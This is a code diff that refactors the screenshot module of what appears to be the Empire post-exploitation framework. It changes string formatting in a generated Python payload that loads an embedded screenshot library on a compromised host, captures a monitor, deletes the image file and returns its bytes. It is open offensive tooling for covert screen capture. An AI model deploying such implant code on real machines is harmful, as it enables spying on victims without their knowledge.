@@ -1,11 +1,10 @@
 import base64
-from builtins import object
 from typing import Dict, Optional, Tuple
 
 from empire.server.core.module_models import EmpireModule
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -22,23 +21,23 @@ class Module(object):
         script = """
 import os
 import base64
-data = "%s"
+data = "{}"
 def run(data):
     rawmodule = base64.b64decode(data)
     zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
     if "mss" not in moduleRepo.keys():
         moduleRepo["mss"] = zf
         install_hook("mss")
-    
+
     from mss import mss
     m = mss()
-    file = m.shot(mon=%s,output='%s')
+    file = m.shot(mon={},output='{}')
     raw = open(file, 'rb').read()
-    run_command('rm -f %%s' %% (file))
+    run_command('rm -f %s' % (file))
     print(raw)
 
 run(data)
-""" % (
+""".format(
             module_data,
             params["Monitor"],
             params["SavePath"],
